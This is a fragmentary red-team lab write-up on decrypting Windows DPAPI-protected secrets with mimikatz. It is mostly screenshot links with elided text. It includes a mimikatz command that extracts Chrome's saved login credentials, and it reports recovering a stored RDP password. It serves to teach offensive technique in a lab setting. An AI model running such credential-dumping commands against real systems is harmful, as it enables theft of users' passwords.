...
This lab is based on the article posted by harmj0y https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
...
```
![](<../../_assets/Screenshot from 2019-04-13 15-31-49.png>)

Or Chrome's saved credentials:
```csharp
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
![](<../../_assets/Screenshot from 2019-04-13 15-34-29.png>)
...
```
![text "spotless" encrypted into a blob of bytes](<../../_assets/Screenshot from 2019-04-13 15-42-36.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 15-43-02.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 15-55-38.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 16-03-34.png>)
...
```
![](<../../_assets/Screenshot from 2019-04-13 16-05-55.png>)
...
```
![](<../../_assets/Screenshot from 2019-04-13 18-02-42.png>)
...
```
![](<../../_assets/Screenshot from 2019-04-13 16-57-55.png>)
...
```
![](<../../_assets/Screenshot from 2019-04-13 17-11-48.png>)
...
```
![](<../../_assets/Screenshot from 2019-04-13 17-16-47.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 20-30-47.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 20-31-58.png>)
...
![](<../../_assets/Screenshot from 2019-04-13 21-21-26.png>)
...
![](<../../_assets/Screenshot from 2019-04-17 19-45-00.png>)
...
![](<../../_assets/Screenshot from 2019-04-17 19-45-47.png>)
...
![](<../../_assets/Screenshot from 2019-04-17 19-52-36.png>)
...
![](<../../_assets/Screenshot from 2019-04-17 19-58-54.png>)

We can see that we were able to successfully decrypt the RDP password stored in `spotless.rdg`:

![](<../../_assets/Screenshot from 2019-04-17 20-05-04.png>)
...
[source record](../../sources/redteamingtactics/reading-dpapi-encrypted-secrets-with-mimikatz-and-c.md)
